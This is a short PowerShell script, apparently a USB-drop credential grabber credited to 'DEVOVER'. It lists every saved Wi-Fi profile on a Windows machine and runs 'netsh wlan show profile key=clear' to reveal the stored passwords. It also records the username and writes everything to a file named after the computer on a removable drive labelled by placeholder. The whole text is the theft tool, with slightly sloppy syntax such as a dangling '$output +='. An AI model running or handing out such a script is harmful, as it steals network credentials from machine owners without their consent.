$output = @()
$y = (netsh wlan show profile | Out-String) -replace "    All User Profile     :" -split "`r`n "
$output = write-output "Username: $env:USERNAME `r`n"
$output += write-output "This script was created by DEVOVER `r`n"
$output += write-output "Follow me Github: @kdandy `r`n"
$output +=

foreach ($i in $y)
{
netsh wlan show Profile $i key=clear | Select-String -Pattern "SSID name"
write-output `r`n 
netsh wlan show Profile $i key=clear | Select-String -Pattern "content"
write-output `r`n ------------------------------------------------ `r`n
}

$output | out-file ((gwmi win32_volume -f 'label=''YOURNAMELABEL''').Name+$env:computername+'.txt')
